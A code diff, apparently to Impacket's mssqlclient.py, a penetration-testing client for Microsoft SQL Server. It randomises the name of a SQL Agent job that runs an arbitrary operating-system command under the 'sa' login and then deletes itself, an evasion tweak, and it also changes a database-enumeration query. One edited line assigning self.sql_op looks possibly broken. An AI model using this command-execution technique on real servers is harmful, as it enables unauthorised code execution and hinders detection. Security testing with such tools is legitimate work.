@@ -23,6 +23,8 @@ import argparse
 import sys
 import os
 import logging
+import random
+import string
 
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
@@ -248,7 +250,7 @@ if __name__ == '__main__':
 
         def sql_query(self, query, show=True):
             if self.at is not None and len(self.at) > 0:
-                self.sql_op(self.sql, show_queries=self.show_queries, at=self.at, codec=self.codec)
+                self.sql_op = sql_op(self.sql, show_queries=self.show_queries, at=self.at, codec=self.codec)
                 for (linked_server, prefix) in self.at[::-1]:
                     query = "EXEC ('" + prefix.replace("'", "''") + query.replace("'", "''") + "') AT " + linked_server
             if self.show_queries and show:
@@ -277,14 +279,15 @@ if __name__ == '__main__':
 
         def do_sp_start_job(self, s):
             try:
+                ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
                 self.sql_query("DECLARE @job NVARCHAR(100);"
-                                   "SET @job='IdxDefrag'+CONVERT(NVARCHAR(36),NEWID());"
+                                   "SET @job='{}'+CONVERT(NVARCHAR(36),NEWID());"
                                    "EXEC msdb..sp_add_job @job_name=@job,@description='INDEXDEFRAG',"
                                    "@owner_login_name='sa',@delete_level=3;"
                                    "EXEC msdb..sp_add_jobstep @job_name=@job,@step_id=1,@step_name='Defragmentation',"
-                                   "@subsystem='CMDEXEC',@command='%s',@on_success_action=1;"
+                                   "@subsystem='CMDEXEC',@command='{}',@on_success_action=1;"
                                    "EXEC msdb..sp_add_jobserver @job_name=@job;"
-                                   "EXEC msdb..sp_start_job @job_name=@job;" % s)
+                                   "EXEC msdb..sp_start_job @job_name=@job;".format(ran_str, s))
                 self.sql.printReplies()
                 self.sql.printRows()
             except:
@@ -335,7 +338,7 @@ if __name__ == '__main__':
 
         def do_enum_db(self, line):
             try:
-                self.sql_query("select name, is_trustworthy_on from sys.databases")
+                self.sql_query("SELECT dbid, name, crdate, filename from master.dbo.sysdatabases;")
                 self.sql.printReplies()
                 self.sql.printRows()
             except:
